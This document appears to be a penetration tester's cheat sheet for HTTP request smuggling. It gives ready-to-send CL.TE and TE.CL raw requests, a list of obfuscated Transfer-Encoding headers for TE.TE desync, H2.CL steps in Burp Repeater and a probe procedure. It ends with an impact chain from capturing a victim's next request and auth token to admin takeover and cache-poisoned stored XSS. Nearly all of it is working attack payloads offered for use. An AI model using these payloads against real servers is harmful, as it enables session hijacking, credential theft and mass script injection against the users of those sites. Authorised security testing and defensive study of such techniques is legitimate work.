## HTTP SMUGGLING PAYLOADS

### CL.TE — Content-Length front-end, Transfer-Encoding back-end
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL — Transfer-Encoding front-end, Content-Length back-end
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0


```

### TE.TE — Both support Transfer-Encoding, obfuscate to disable one
```http
# Obfuscate the TE header so one layer ignores it
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

### H2.CL — HTTP/2 front-end with Content-Length injection
```
# In Burp Repeater, switch to HTTP/2
# Add Content-Length header manually (not auto-set by HTTP/2)
# Front-end ignores CL (HTTP/2 uses :content-length pseudo-header)
# Back-end uses CL → desync
```

### Detection (Burp)
```
1. Install HTTP Request Smuggler extension
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. All four probe types automatically sent
4. ~10-second timeout on CL.TE probe = back-end waiting = CONFIRMED
```

### Impact Chain
```
Basic desync          → Capture victim's next request → Read their auth token
+ Admin user traffic  → Access admin as victim
+ Cache poisoning     → Stored XSS at scale for all users
```
